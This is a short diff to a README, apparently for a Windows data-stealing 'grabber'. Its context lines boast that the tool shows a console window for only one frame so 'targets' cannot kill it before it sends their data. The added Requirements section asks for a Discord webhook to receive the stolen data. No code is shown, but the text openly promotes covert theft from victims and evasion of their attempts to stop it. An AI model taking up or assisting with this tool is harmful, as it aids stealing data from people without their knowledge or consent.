@@ -9,3 +9,8 @@ The so-called "background-process":
     Instead of the grabber having a console window open for 5 seconds which can be used to kill it before sending the data,
     you can only see a console window for 1 frame that immediately closes. Your "targets" won't be able to stop the grabber in that short time,
     and finding the right process via task-manager takes too long!
+## Requirements
+- Windows 7 or higher
+- Both files in the same folder
+- Working internet conenction while executing(should be obvious)
+- A discord webhook to receive the data
